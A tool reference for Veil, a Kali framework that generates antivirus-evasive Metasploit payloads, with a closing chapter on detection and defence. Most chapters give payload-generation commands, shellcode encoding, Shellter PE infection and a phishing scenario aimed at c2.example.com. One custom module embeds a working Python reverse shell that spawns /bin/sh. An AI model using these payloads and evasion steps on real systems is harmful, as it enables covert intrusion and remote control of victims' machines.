---
tool_name: "veil"
display_name: "Veil"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "av_evasion"
install_command: "sudo apt install veil"
version: "3.1.14"
github_repo: "https://github.com/veil-framework/veil"
kali_tools_page: "https://www.kali.org/tools/veil/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["av-evasion", "payload-generation", "metasploit", "meterpreter", "encoder"]
related_tools: ["shellter", "msfvenom", "scite"]
---

# Veil

## Chapter 1: Introduction & Overview

### What is Veil?

Veil is a framework designed to generate Metasploit payloads that bypass common antivirus solutions. It contains two main tools: **Veil-Evasion** (payload generation with AV evasion) and **Veil-Ordnance** (shellcode generation and encoding). Veil produces payloads in multiple languages including Python, Go, C, and PowerShell.

### History & Background

- **Created:** 2013 by ChrisTruncer (@ChrisTruncer)
- **Maintained:** Veil-Framework community
- **License:** BSD License
- **Purpose:** Generate AV-evasive Metasploit payloads

Veil was one of the first tools to systematically address AV evasion for Metasploit payloads. It automates the process of encoding, obfuscating, and compiling payloads to avoid signature-based detection.

### When to Use This Tool

- **AV evasion:** Generate payloads that bypass signature-based detection
- **Payload delivery:** Create custom payload formats for social engineering
- **Red team operations:** Produce evasive initial access payloads
- **Penetration testing:** Test organization's AV effectiveness

### Key Concepts

- **Veil-Evasion:** Generates fully-undetectable (FUD) payloads
- **Veil-Ordnance:** Generates and encodes shellcode
- **Payload Modules:** Language-specific payload generators (Python, Go, C, PowerShell, etc.)
- **Encoders:** Custom encoding to avoid AV signatures
- **PyInstaller/Py2Exe:** Compiles Python payloads to standalone EXEs

### Supported Payload Languages

| Language | Detection Rate | Notes |
|----------|---------------|-------|
| Go | Very low | Compiled, no Python dependency |
| C | Low | Direct compilation, minimal dependencies |
| PowerShell | Low | In-memory execution, fileless |
| Python | Medium | Requires PyInstaller/Py2Exe |
| C# | Low | .NET assemblies |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Kali Linux, Debian 8+, Ubuntu 15.10+, or other supported distros
- **RAM:** 4 GB minimum (Wine environment)
- **Disk Space:** ~1 GB (including Wine and dependencies)
- **Privileges:** Root (for initial setup)

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update && sudo apt install veil
```

**Explanation:** Installs Veil from Kali's repositories. Requires post-installation setup.

#### Method 2: From Git

```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./config/setup.sh --force --silent
```

**Explanation:** Cloning from GitHub ensures the latest version. The setup script installs all dependencies including Wine.

### Post-Installation Setup

#### Run Setup Script

```bash
# If installed via APT, run setup
cd /usr/share/veil
sudo ./config/setup.sh --force --silent
```

**Explanation:** The setup script installs Wine, Python dependencies, and configures the environment. The `--force` flag overwrites previous installations, and `--silent` performs unattended installation.

#### Regenerate Configuration

```bash
cd /usr/share/veil/config
sudo ./update-config.py
```

**Explanation:** Regenerates `/etc/veil/settings.py` if the configuration is corrupted or after updates.

### Verify Installation

```bash
veil --version
```

**Explanation:** Confirms Veil is installed and operational.

### Directory Structure

```
/usr/share/veil/
├── Veil.py              # Main entry point
├── config/              # Configuration files
├── lib/                 # Core library code
├── tools/               # Payload modules
└── output/              # Generated payloads
    ├── compiled/        # Compiled executables
    ├── source/          # Source code
    └── handlers/        # Metasploit handler files
```

---

## Chapter 3: Basic Usage

### Launching Veil

```bash
veil
```

**Explanation:** Opens the Veil interactive menu. The main menu lists available tools (Evasion and Ordnance).

### Main Menu Navigation

```
Veil>:
  Available Commands:
    list      - List available tools
    use       - Use a specific tool
    info      - Information on a specific tool
    options   - Show Veil configuration
    update    - Update Veil
    exit      - Exit Veil
```

### Using Veil-Evasion

#### List Available Payloads

```bash
Veil> use Evasion
Veil/Evasion> list
```

**Explanation:** Shows all available payload modules with their language and description.

#### Generate a Payload (Interactive)

```bash
Veil/Evasion> use 1
# Follow prompts for LHOST, LPORT, etc.
```

**Explanation:** Interactive mode guides through payload selection and configuration.

#### Generate a Payload (CLI)

```bash
veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444 -o payload
```

**Explanation:** Command-line mode for scripted payload generation. The `-t` flag selects the tool, `-p` specifies the payload module, and `-o` sets the output name.

### Using Veil-Ordnance

#### Generate Shellcode

```bash
veil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444
```

**Explanation:** Veil-Ordnance generates shellcode for use with other tools (like Shellter).

#### List Available Encoders

```bash
veil -t Ordnance --list-encoders
```

**Explanation:** Shows available shellcode encoders for obfuscation.

### Output Files

After generation, Veil creates:

```
output/
├── compiled/payload.exe      # Compiled executable
├── source/payload.py         # Source code (or .go, .cs, etc.)
└── handlers/payload.rc       # Metasploit handler script
```

**Explanation:** The compiled binary is ready for delivery, the source shows the generated code, and the handler file configures Metasploit to receive the connection.

---

## Chapter 4: Intermediate Usage

### Payload Module Selection

#### Go Payloads

```bash
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  -o go_reverse_tcp
```

**Explanation:** Go payloads compile to native executables with no runtime dependencies. Low detection rate.

#### C Payloads

```bash
veil -t Evasion -p c/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  -o c_reverse_tcp
```

**Explanation:** C payloads compile with MinGW, producing native Windows executables.

#### PowerShell Payloads

```bash
veil -t Evasion -p powershell/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  -o ps_reverse_tcp
```

**Explanation:** PowerShell payloads execute in-memory, avoiding disk-based detection.

### Compiler Options

```bash
# Use PyInstaller (default for Python payloads)
veil -t Evasion -p python/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  --compiler pyinstaller

# Use Py2Exe (lower detection rate)
veil -t Evasion -p python/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  --compiler py2exe
```

**Explanation:** Py2Exe generally produces lower detection rates than PyInstaller for Python payloads.

### Custom Payload Options

```bash
veil -t Evasion -p python/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  -c "HOST=192.168.1.100 PORT=4444"
```

**Explanation:** The `-c` flag passes custom options to the payload module.

### Metasploit Integration

#### Using Veil with Metasploit Handler

```bash
# Generate payload
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 -o payload

# Use generated handler file
msfconsole -r output/handlers/payload.rc
```

**Explanation:** Veil automatically generates a Metasploit resource file for handler configuration.

#### Custom Handler Setup

```bash
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST 192.168.1.100;
set LPORT 4444;
exploit
"
```

**Explanation:** Manual handler setup for more control over listener configuration.

### MSFVenom Integration

```bash
# Generate msfvenom shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f raw > /tmp/shellcode.bin

# Use with Veil-Ordnance encoding
veil -t Ordnance -e shikata_ga_nai -b "\x00\x0a\x0d" \
  --ordnance-file /tmp/shellcode.bin
```

**Explanation:** Combine msfvenom shellcode generation with Veil's encoding capabilities.

---

## Chapter 5: Advanced Usage

### Advanced Evasion Techniques

#### Payload Chaining

```bash
# Generate multiple payloads with different encoders
for encoder in shikata_ga_nai alpha_mixed; do
  veil -t Ordnance --ordnance-payload rev_tcp \
    --ip 192.168.1.100 --port 4444 \
    -e $encoder -o "payload_${encoder}"
done
```

**Explanation:** Testing multiple encoding approaches improves the chance of evading detection.

#### Custom Bad Characters

```bash
veil -t Ordnance --ordnance-payload rev_tcp \
  --ip 192.168.1.100 --port 4444 \
  -b "\x00\x0a\x0d\x20" \
  -o custom_encoded
```

**Explanation:** Specifying bad characters ensures the payload avoids bytes that cause issues in the target environment.

#### Print Stats

```bash
veil -t Ordnance --ordnance-payload rev_tcp \
  --ip 192.168.1.100 --port 4444 \
  --print-stats
```

**Explanation:** Shows payload statistics including size, entropy, and encoding details.

### Custom Payload Modules

#### Creating a Custom Python Payload

```python
# /usr/share/veil/payloads/python/custom/my_payload.py

import sys

def generate():
    payload = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    return payload
```

**Explanation:** Custom payload modules extend Veil's capabilities for specific use cases.

#### Registering Custom Modules

```bash
# Place custom module in the appropriate directory
cp my_payload.py /usr/share/veil/payloads/python/custom/

# Verify it appears in the list
veil -t Evasion --list-payloads
```

**Explanation:** Custom modules are automatically discovered by Veil from the payloads directory.

### Advanced Compilation

#### Cross-Compilation

```bash
# Generate Go payload for Windows
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  --goos windows --goarch amd64
```

**Explanation:** Go payloads support cross-compilation for different OS/architecture combinations.

#### Stripping Debug Info

```bash
# Use compiler flags to strip debug information
veil -t Evasion -p c/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  --compiler-options "-s -W"
```

**Explanation:** Stripping debug info reduces file size and removes indicators that AV engines scan.

### Integration with Other Tools

#### With Shellter

```bash
# Generate shellcode with Veil-Ordnance
veil -t Ordnance --ordnance-payload rev_tcp \
  --ip 192.168.1.100 --port 4444 \
  -o /tmp/shellcode.bin

# Infect a PE with Shellter
shellter
# Stealth mode -> target PE -> /tmp/shellcode.bin
```

**Explanation:** Combine Veil's encoding with Shellter's PE infection for double-layer evasion.

#### With Cobalt Strike

```bash
# Generate Cobalt Strike shellcode (from CS)
# Then encode with Veil-Ordnance
veil -t Ordnance -e shikata_ga_nai -b "\x00" \
  --ordnance-file /tmp/cs_shellcode.bin
```

**Explanation:** Veil can encode Cobalt Strike shellcode to reduce detection.

### Automation Scripts

#### Batch Payload Generation

```bash
#!/bin/bash
# generate_payloads.sh

LHOST="192.168.1.100"
LPORT="4444"
OUTPUT_DIR="/tmp/veil_payloads"

mkdir -p "$OUTPUT_DIR"

# List of payloads to generate
PAYLOADS=(
    "go/meterpreter/rev_tcp.py"
    "c/meterpreter/rev_tcp.py"
    "powershell/meterpreter/rev_tcp.py"
)

for payload in "${PAYLOADS[@]}"; do
    name=$(echo "$payload" | tr '/' '_')
    echo "[*] Generating: $name"
    veil -t Evasion -p "$payload" \
        --ip "$LHOST" --port "$LPORT" \
        -o "$OUTPUT_DIR/$name" 2>/dev/null
done

echo "[+] All payloads generated in $OUTPUT_DIR"
```

**Explanation:** Automated generation of multiple payload variants for comprehensive testing.

#### Python Wrapper

```python
#!/usr/bin/env python3
import subprocess
import os

class VeilGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def generate(self, payload_module, output_name):
        cmd = [
            "veil", "-t", "Evasion",
            "-p", payload_module,
            "--ip", self.lhost,
            "--port", self.lport,
            "-o", output_name
        ]
        subprocess.run(cmd, check=True)
        return f"output/compiled/{output_name}.exe"
    
    def generate_encoded_shellcode(self, encoder=None):
        cmd = [
            "veil", "-t", "Ordnance",
            "--ordnance-payload", "rev_tcp",
            "--ip", self.lhost,
            "--port", self.lport
        ]
        if encoder:
            cmd.extend(["-e", encoder])
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout

# Usage
gen = VeilGenerator("192.168.1.100", "4444")
exe_path = gen.generate("go/meterpreter/rev_tcp.py", "my_payload")
print(f"Generated: {exe_path}")
```

**Explanation:** Python wrapper for integrating Veil into larger attack frameworks.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Deliver a reverse shell bypassing AV

**Steps:**

```bash
# 1. Generate Go payload (low detection)
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 10.10.14.5 --port 4444 -o ctf_payload

# 2. Start handler
msfconsole -r output/handlers/ctf_payload.rc

# 3. Transfer and execute on target
```

**Explanation:** Go payloads compile to standalone executables with no dependencies, ideal for CTF scenarios.

### Scenario 2: Penetration Test

**Objective:** Test AV detection rates across multiple payload types

**Steps:**

```bash
# 1. Generate payloads in all supported languages
for lang in go c powershell python; do
  veil -t Evasion -p "${lang}/meterpreter/rev_tcp.py" \
    --ip 192.168.1.100 --port 4444 \
    -o "test_${lang}"
done

# 2. Upload to VirusTotal and record detection rates
# 3. Generate report comparing detection rates
```

**Explanation:** Systematic testing of AV evasion across different payload languages and compilation methods.

### Scenario 3: Red Team Operation

**Objective:** Covert initial access via phishing

**Steps:**

```bash
# 1. Generate multiple payload variants
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip c2.example.com --port 443 \
  -o phishing_payload

# 2. Verify low detection rate
# 3. Embed in phishing infrastructure
# 4. Set up handler
msfconsole -r output/handlers/phishing_payload.rc
```

**Explanation:** Low-detection Go payloads combined with HTTPS port for maximum evasion.

### Scenario 4: AV Bypass Testing

**Objective:** Test organization's AV against various evasion techniques

**Steps:**

```bash
# 1. Generate baseline payload (no encoding)
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.100 --port 4444 \
  -o baseline

# 2. Generate encoded variants
veil -t Ordnance --ordnance-payload rev_tcp \
  --ip 192.168.1.100 --port 4444 \
  -e shikata_ga_nai -o encoded

# 3. Test each against AV
# 4. Document which variants are detected
```

**Explanation:** Methodical testing reveals which evasion techniques are effective against specific AV products.

---

## Chapter 7: Detection & Defense

### How Defenders Detect Veil

#### Static Indicators

- **File hashes:** Known Veil-generated payload hashes
- **String patterns:** Common strings in Veil payloads
- **PE characteristics:** Sections and imports typical of Veil output

#### Behavioral Indicators

- **Network connections:** Reverse TCP connections to known C2 ports
- **Process behavior:** Suspicious child processes from Office applications
- **Memory indicators:** Injected code in legitimate processes

#### Detection Rules

```yaml
# YARA rule for Veil payloads
rule veil_payload {
    strings:
        $s1 = "Veil" ascii
        $s2 = "meterpreter" ascii
        $py = "import socket" ascii
    condition:
        any of them
}
```

**Explanation:** YARA rules can detect Veil-generated payloads through string matching and structural analysis.

### Mitigation Strategies

#### Preventive Controls

1. **Application whitelisting:** Block unapproved executables
2. **Script execution policies:** Restrict PowerShell and script execution
3. **Network segmentation:** Limit outbound connections
4. **EDR deployment:** Monitor for payload execution patterns

#### Detective Controls

1. **Behavioral analysis:** Detect reverse shell patterns
2. **Network monitoring:** Alert on connections to non-standard ports
3. **Memory scanning:** Detect injected code
4. **File monitoring:** Alert on newly created executables

### Blue Team Response

1. **Deploy next-gen AV** with behavioral detection
2. **Implement AMSI** for PowerShell inspection
3. **Enable exploit protection** on endpoints
4. **Monitor for compilation activity** (Go, MinGW)
5. **Restrict outbound connections** via host firewall

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "0 payloads loaded"

**Cause:** Configuration file not generated or corrupted

**Solution:**

```bash
cd /usr/share/veil/config
sudo ./update-config.py
# Or re-run setup
sudo ./config/setup.sh --force
```

**Explanation:** Veil needs a valid configuration file to discover payload modules.

#### Error: "Wine not found"

**Cause:** Wine not installed or not in PATH

**Solution:**

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 wine64
```

**Explanation:** Veil uses Wine to compile Python payloads for Windows.

#### Error: "PyInstaller not found"

**Cause:** PyInstaller not installed in Wine environment

**Solution:**

```bash
cd /usr/share/veil
sudo ./config/setup.sh --force
```

**Explanation:** The setup script installs PyInstaller in the Wine environment.

#### Error: "Permission denied"

**Cause:** Insufficient permissions for output directory

**Solution:**

```bash
sudo chown -R $(whoami) /usr/share/veil/output
# Or run Veil with sudo
sudo veil
```

**Explanation:** Output directory requires write permissions for payload generation.

### Performance Optimization

```bash
# Use faster compiler (Go over Python)
veil -t Evasion -p go/meterpreter/rev_tcp.py ...

# Clean old payloads
veil --clean
```

**Explanation:** Go payloads compile faster and produce smaller binaries than Python payloads.

### FAQ

**Q: Does Veil bypass all antivirus?**
A: No. Veil generates payloads with low detection rates, but modern EDR solutions with behavioral detection may still catch them.

**Q: Is Veil still maintained?**
A: The repository was archived in January 2024. It remains functional but receives no updates.

**Q: What's the difference between Veil-Evasion and msfvenom?**
A: Veil-Evasion focuses specifically on AV evasion with custom encoders and compilation. msfvenom is a general-purpose payload generator.

**Q: Can Veil generate 64-bit payloads?**
A: Yes, through Go and C payload modules. Python payloads are 32-bit via Wine.

**Q: How do I test detection rates?**
A: Upload generated payloads to VirusTotal and check the detection ratio.

---

## Resources

### Official Documentation

- [Veil GitHub](https://github.com/veil-framework/veil)
- [Veil Framework Website](https://www.veil-framework.com/)
- [Kali Linux Veil](https://www.kali.org/tools/veil/)

### Tutorials

- [Veil Usage Guide - HackTricks](https://book.hacktricks.xyz/)
- [AV Evasion Techniques - OffSec PEN-200](https://www.offsec.com/courses/pen-200/)
- [Veil Framework Documentation](https://www.veil-framework.com/framework/)

### Related Tools

- **msfvenom:** Metasploit payload generator
- **Shellter:** PE infection for AV evasion
- **sgn:** Shikata Ga Nai encoder
- **scite:** Shellcode compiler

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
